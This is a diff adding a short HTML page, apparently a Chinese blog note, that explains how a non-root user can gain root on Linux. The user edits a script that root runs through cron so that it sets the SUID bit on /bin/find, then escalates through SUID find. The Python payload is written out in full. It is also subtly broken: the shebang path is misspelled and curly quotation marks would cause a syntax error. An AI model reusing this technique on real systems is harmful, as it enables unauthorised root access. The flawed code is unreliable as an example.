@@ -1,0 +1,17 @@
+<p>refer to: <br /><a href="https://juejin.cn/post/7166171652764467231 " target="_blank">https://juejin.cn/post/7166171652764467231</a>
+</p>
+<h3>前提：</h3>
+<p>1. root执行了crontab </p>
+<p>2. 该 crontab 任务是执行一个脚本，例如： * * * * * run my.py </p>
+<h3>思路</h3>
+<p>只要非root用户，具备修改my.py文件的内容，就可以达到拿到root的效果：</p>
+<p>例如，非root用户，修改my.py: </p>
+<pre>#!/user/bin/env python
+import os
+import sys
+try:
+    os.system(‘chmod u+s /bin/find’)
+except:&#160;<br />    sys.exit&#160;
+</pre>
+<p>这样，我们就为 /bin/find 加上了suid，</p>
+<p>接下来就可以正常通过suid的方式来提权了</p>
